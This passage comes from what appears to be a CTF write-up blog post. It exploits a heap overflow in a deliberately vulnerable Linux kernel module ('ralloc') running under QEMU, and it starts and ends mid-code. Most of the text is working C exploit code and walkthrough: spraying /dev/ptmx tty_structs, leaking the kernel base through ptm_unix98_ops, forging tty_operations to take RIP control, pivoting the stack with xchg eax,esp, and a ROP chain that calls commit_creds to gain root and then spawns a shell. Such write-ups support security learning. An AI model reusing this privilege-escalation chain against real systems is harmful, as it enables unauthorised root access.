</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">buf</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Filling Chunk at Index: %ld with %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1002</span><span class="p">,</span>  <span class="o">&amp;</span><span class="n">msg</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Error!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">struct</span> <span class="n">message</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="n">msg</span><span class="p">.</span><span class="n">buf</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Reading data from index: %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1003</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Error!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>The <code>*.cpio</code> file could be compiled with <code>find . | cpio -H newc -ov -F ../initramfs.cpio</code></p>
</blockquote>
<p>For the experimentation, I made a QEMU instance of the Linux Kernel <code>5.0.-38</code> with the <code>ralloc.ko</code> as a module loaded to it upon starting, which I uploaded to the github, linked above, try it yourself.</p>
<p>The question we end up at last at exactly how are we supposed to exploit this heap overflow which only gives us the extra 32 bytes to do read/write. Upon the extensive research, I found <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#tty_struct" target="_blank" rel="noreferrer">this blog post</a> by <a href="https://twitter.com/ptr-yudai" target="_blank" rel="noreferrer">ptr-yudai</a>, which if translated to the english stated as follows:-</p>
<hr>
<p><strong>Size</strong> : 0x2e0 (kmalloc-1024)
<strong>base</strong> : <code>ops</code> the <code>ptm_unix98_ops</code> leak possible because it refers to. Besides that, it pointed to the data area of ​​the kernel in about two places.
<strong>Heap</strong> : <code>dev</code>, driver<code>leak possible because like many of the object is pointing to the members of the heap and own. The target SLUB has not been investigated. **stack** : I can't seem to leak. **Secure** :</code>/dev/ptmx<code>Open. **Release** : Close the open</code>ptmx<code>. **Remarks** : </code>ops` RIP can be controlled by rewriting.
<strong>Reference</strong> : <a href="https://elixir.bootlin.com/linux/v4.19.98/source/include/linux/tty.h#L283" target="_blank" rel="noreferrer">https://elixir.bootlin.com/linux/v4.19.98/source/include/linux/tty.h#L283</a></p>
<hr>
<p>Considering the above, I then focused on a writeup wrote by the same author for the challenge he created, which can be found <a href="https://hackmd.io/@ptr-yudai/rJp1TpbBU" target="_blank" rel="noreferrer">here</a>, this if try to compare from the <code>ralloc</code>, the initial methodology seems to be same.</p>
<p>Apparently, going in-depth on why this <code>/dev/ptmx</code> is the best target would be better for a seperate post itself, so I am leaving the unncessary part in this challenge context and will explain the things as we move on. To replicate the same methodology to get the RIP control, firstly I allocated a chunk of size <code>0x400</code> which was the meximun size the ioctl can allocate the chunk of and I also opened the <code>ptmx</code> device.</p>
<p>I turned off the KASLR on the QEMU instance and already got the address of the function we needed:-</p>
<ul>
<li><code>commit_creds</code></li>
<li><code>ptm_unix98_ops</code></li>
<li><code>prepare_kernel_creds</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x420</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* open drivers */</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/ralloc&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;/dev/ralloc&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="n">spray_fd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/ptmx&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_NOCTTY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">kmalloc</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">get</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x420</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Now, doing so, upon setting up a breakpoint at the <code>rope2_ioctl</code>&rsquo;s <code>kmalloc</code> call and stepping to it, we see the heap structure as:-</p>
<blockquote>
<p>Note: Before debugging do: <code>add-symbol-file ralloc.ko 0xffffffffc0002000</code> in the <code>gdb-gef</code>.</p>
</blockquote>
<p>Then, moving on, setup a breakpoint at the <code>b *rope2_ioctl + 342</code> and then running the program, once it hits the breakpoint, when we see the memory:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/kmalloc.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, considering that, if we see for the memory content, the <code>ptm_unix98_ops</code> object was at <code>heap.size + 32</code>, since <code>heap.size</code> was <code>0x400</code>, the <code>ptm_uniz98_ops</code> was at the <code>0x420</code>. Using the <code>get</code> function, we can have the leak:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/leak.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, since we have a leak, this will be useful in retrieving the base address to calculate the address of the function and gadget we will need, for now, since the structure as defined, if we can overwrite the <code>*ops</code> with the help of the fake <code>tty_operations</code> array created from the userland, we can have the RIP control.</p>
<blockquote>
<p>The POC for <code>tty_struct</code> and RIP control can be understood from here: <a href="https://www.lazenca.net/pages/viewpage.action?pageId=29327365#id-07.Use-After-Free%28UAF%29%28feat.tty_struct%29-PoCcode" target="_blank" rel="noreferrer">https://www.lazenca.net/pages/viewpage.action?pageId=29327365#id-07.Use-After-Free(UAF)(feat.tty_struct)-PoCcode</a></p>
</blockquote>
<p>Now compiling the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kbase</span><span class="p">,</span> <span class="n">kheap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ptm_unix98_ops</span> <span class="o">=</span> <span class="mh">0x10af6a0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi</span><span class="p">,</span> <span class="n">kpti</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">init_creds</span> <span class="o">=</span> <span class="mh">0x165fa00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0xc0540</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">spray_fd</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//[..snip..] 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x420</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* open drivers */</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/ralloc&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;/dev/ralloc&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="n">spray_fd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/ptmx&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_NOCTTY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">kmalloc</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">get</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x420</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">kbase</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="mi">131</span><span class="p">]</span> <span class="o">-</span> <span class="n">ptm_unix98_ops</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Leak                :   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="mi">131</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">131</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfff</span> <span class="o">!=</span> <span class="mh">0x6a0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] Error, exploit failed.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Base                :   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Gadget              :   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0xb55c7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">commit_creds</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">commit_creds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">init_creds</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">init_creds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x8b8a0</span><span class="p">;</span>      <span class="c1">// pop rdi; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">kpti</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0xc00a34</span><span class="p">;</span>       <span class="c1">// swapgs_restore_regs_and_return_to_usermode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] init_creds:   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">init_creds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] commit_creds        :   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] get_shell            :   %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">get_shell</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] DEBUG....:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">buf</span><span class="p">[</span><span class="mi">131</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_tty_operations</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">fill</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x420</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">spray_fd</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Doing the above, we get the RIP overwritten as <code>0xdeadbeef</code>.</p>
<p>






  
  
<figure><img src="/img/ropetwo/deadbeef.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, moving on, we will have to somehow execute the ROP chain which will be <code>commit_creds(init_creds())</code>, and call a function which will spawn shell. As for my initial research, I found out that we can use a gadget like <code>xchg eax, esp</code> and <code>mmap</code> a memory region with the lower 32 bit address of the gadget and store our ROP chain to it, which once the RIP hits the gadget, would exchange the <code>eax</code> and <code>esp</code> would execute instructions from the <code>mmap</code>&rsquo;d region. To do this, I change the 12th index of the <code>fake_tty_operations</code> to the address of the <code>xchg eax, esp</code> gadget and set a breakpoint at the address within gdb:</p>
<blockquote>
<p>The gadget was found with the help of ROPGadget and is from the <code>.text</code> section because of r/w permissions. `</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">  <span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x4cba4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">buf</span><span class="p">[</span><span class="mi">131</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_tty_operations</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">fill</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x420</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span></code></pre></div><p>






  
  
<figure><img src="/img/ropetwo/gadget.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>If we step into the instruction and see the values of both <code>eax</code> &amp; <code>esp</code>, we will see:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/esp.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>As seen above, the <code>rsp</code> is now pointing to the loweer 32 bit address of the gadget, now, we can <code>mmap</code> a shared memory page such that it&rsquo;ll be accessible between the kernel and the userland space with:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">mapped</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="n">pivot_target</span> <span class="o">&amp;</span> <span class="mh">0xfffff000</span><span class="p">,</span> <span class="mh">0x1000000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_POPULATE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span></code></pre></div><p>Now, time to craft a ROP chain which will be stored in the shared memory region, following is the ROP chain I created:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">asm</span> <span class="nf">volatile</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov %0, %%cs</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov %1, %%ss</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov %2, %%rsp</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;pushfq</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="s">&#34;pop %3</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="o">:</span> <span class="s">&#34;=r&#34;</span> <span class="p">(</span><span class="n">user_cs</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span> <span class="p">(</span><span class="n">user_ss</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span> <span class="p">(</span><span class="n">user_sp</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span> <span class="p">(</span><span class="n">user_rflags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">rop</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="n">pop_rdi</span><span class="p">,</span> <span class="c1">// pop rdi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>         <span class="n">init_creds</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">commit_creds</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">swapgs</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="mh">0xdeadbeef</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">iretq</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">get_shell</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">user_cs</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">user_rflags</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="n">user_sp</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">user_ss</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span></code></pre></div><p>Now, to explain the ROP chain, let&rsquo;s break down:-</p>
<ul>
<li><code>pop rdi; ret</code> this will pop the <code>rdi</code> register which is responsible for holding the 1st arguument in the x86_64 systems.</li>
<li><code>init_creds</code>: This will be given into the <code>rdi</code>.</li>
<li><code>commit_creds</code>, doing so, when the the RIP will reach the <code>commit_creds</code>, it&rsquo;ll execute it as <code>commit_creds(init_creds())</code> which will change the <code>UID</code> for the running process to <code>0</code>.</li>
<li>Then, <code>swapgs</code> will let the it back to the userland safely because of the SMAP and KASLR being enabled, then <code>0xdeadbeef</code> for the padding.</li>
<li><code>iretq</code> will store the the flags and register and the RIP.</li>
<li>Followed by the <code>get_shell</code> function, this will be the RIP.</li>
<li>Rest flags would be restored and will be considered.</li>
</ul>
<p>Now, the final exploit looks like this:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;linux/userfaultfd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/timerfd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kbase</span><span class="p">,</span> <span class="n">kheap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ptm_unix98_ops</span> <span class="o">=</span> <span class="mh">0x10af6a0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi</span><span class="p">,</span> <span class="n">kpti</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">init_creds</span> <span class="o">=</span> <span class="mh">0x165fa00</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0xc0540</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">fake_tty_operations</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">spray_fd</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
